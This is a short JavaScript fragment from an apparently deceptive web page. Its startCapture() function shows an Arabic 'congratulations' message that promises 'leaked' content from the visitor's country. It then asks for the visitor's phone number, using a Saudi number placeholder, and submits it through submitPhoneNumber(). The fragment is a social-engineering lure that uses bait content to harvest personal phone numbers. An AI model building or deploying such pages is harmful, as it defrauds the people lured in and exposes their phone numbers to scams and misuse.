...
async function startCapture() {
    ...
    status.innerHTML = `<div class="success">
        <h3 style="color: #28a745; margin-bottom: 15px;">🎉 مبروك! تم تجهيز كل المحتوى بنجاح</h3>
        <p style="color: #333; font-size: 1.1em; margin: 15px 0;">أنت على بعد خطوة واحدة فقط!</p>
        <p style="color: #666; margin: 10px 0;">ادخل رقم هاتفك ليتم تخصيص المحتوى المسرب من محتوى بلدك الذي يتم تسريبه إلينا يومياً</p>
        <div style="margin: 20px 0;">
            <input type="tel" id="phoneNumber" placeholder="+966 5XX XXX XXX" style="width: 80%; padding: 12px; border: 2px solid #c06c84; border-radius: 10px; font-size: 1.1em; text-align: center; direction: ltr;" />
        </div>
        <button onclick="submitPhoneNumber()" style="background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%); color: white; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">موافق</button>
    </div>`;
}
